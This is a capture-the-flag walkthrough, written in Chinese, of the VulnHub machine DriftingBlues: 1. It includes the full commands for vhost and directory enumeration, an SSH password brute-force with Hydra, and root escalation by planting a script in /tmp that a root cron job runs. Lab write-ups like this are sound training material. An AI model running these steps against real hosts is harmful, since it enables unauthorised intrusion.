# DriftingBlues: 1

https://www.vulnhub.com/entry/driftingblues-1,625/#release

difficulty: Easy

Finish Date：2024-2-25

## IP

192.168.10.150

## Scan

开放了 2 个端口：

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 cae6d11f27f26298efbfe438b5f16777 (RSA)
|   256 a8589999f681c4c2b4da44da9bf3b89b (ECDSA)
|_  256 395b552a79edc3bff516fdbd61292ab7 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Drifting Blues Tech
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

访问 Web 页面 80 port，查看是否有敏感信息。

只找到 2 个邮箱地址：`sheryl@driftingblues.box` 和 `eric@driftingblues.box`。

查看页面源代码，发现 166 行有提示：
`<!-- L25vdGVmb3JraW5nZmlzaC50eHQ= -->`

对其进行 base64 反解码：`/noteforkingfish.txt`，对此页面进行访问。

发现一堆 Ook. Ook. Ook.代码，使用 CTF 中的 Brainfuck/Ook! 解码器对其进行解码，有如下提示：`my man, i know you are new but you should know how to use host file to reach our secret location. -eric`

看样子是配置了虚拟主机，修改攻击机的 hosts 文件，将 `driftingblues.box` 这个域名加到其中，使用 gobuster 对虚拟主机进行扫描。

```
gobuster vhost -u driftingblues.box -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --append-domain
```

扫描结果中发现虚拟主机：`test.driftingblues.box`，将此虚拟主机和对应 ip 也配置到 hosts 文件中，对其访问，显示 `work in progress -eric`。

使用 gobuster 对此虚拟主机进行扫描：

```
gobuster dir -t 64 -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://test.driftingblues.box/ -x .php,.txt,.html
```

发现页面地址：`/robots.txt`。访问后显示如下：

```
User-agent: *
Disallow: /ssh_cred.txt
Allow: /never
Allow: /never/gonna
Allow: /never/gonna/give
Allow: /never/gonna/give/up
```

对 `test.driftingblues.box/ssh_cred.txt` 进行访问。显示如下：

```
we can use ssh password in case of emergency. it was "1mw4ckyyucky".
sheryl once told me that she added a number to the end of the password.
-db
```

提示是原始密码 1mw4ckyyucky 后加了一个数字。根据提示，生成密码字典：
`for i in {0..9}; do echo "1mw4ckyyucky$i" >> pass.txt; done`

用户名尝试使用上面收集的 2 个邮箱的用户名：`sheryl` 和 `eric`

使用 Hydra 进行爆破：

```
hydra -t 20 -l eric -P pass.txt 192.168.20.150 ssh
```

显示结果：`login: eric   password: 1mw4ckyyucky6`

利用上面的用户名和密码进行 ssh 登陆，在用户目录拿到第一个 flag：user.txt。

---

上传 peas 和 pspy 进行系统枚举，peas 中发现有`/var/backups/backup.sh`，其内容如下：

```bash
#!/bin/bash

/usr/bin/zip -r -0 /tmp/backup.zip /var/www/
/bin/chmod

#having a backdoor would be nice
sudo /tmp/emergency
```

pspy 中发现系统上每 1 分钟以 root 用户执行了这个脚本，然后查看`/tmp/emergency`发现没有，这就给了我们自己创建脚本的机会，将以下内容写入到 emergency 脚本中。

```bash
echo -e "#!/bin/bash\ncp /root/root.txt /tmp/root.txt; chmod +r /tmp/root.txt\n" >> /tmp/emergency
chmod +x /tmp/emergency   # 千万别忘记给脚本执行权限
```

## flag

等待 1 分钟，就可以在/tmp 目录下查看到 root.txt 文件了。
